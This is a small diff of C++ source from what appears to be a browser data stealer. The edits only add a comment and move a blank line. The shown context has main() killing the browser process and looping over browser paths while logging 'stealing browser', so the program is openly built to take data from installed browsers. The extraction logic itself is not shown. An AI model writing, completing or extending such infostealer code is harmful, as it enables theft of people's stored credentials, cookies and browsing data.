@@ -12,6 +12,7 @@ std::string read_file_utf8(const std::string& filepath) {
     std::ifstream file(filepath, std::ios::binary); // Open in binary mode
     if (!file) {
         logger::log(logger::error, "Error opening file.");
+        //we have to return a string. so just return an empty one on failure 
         return "";
     }
 
@@ -68,8 +69,8 @@ void log_info() {
 int main() {
 
     definitions::initialize();
-
     kill_browser(definitions::browser_proccess);
+
     for (const auto& [browser_Name, browser_Path] : definitions::browser_paths) {
         logger::log(logger::info, "stealing browser: %s", browser_Name.c_str());
         definitions::browser = browser_Path;
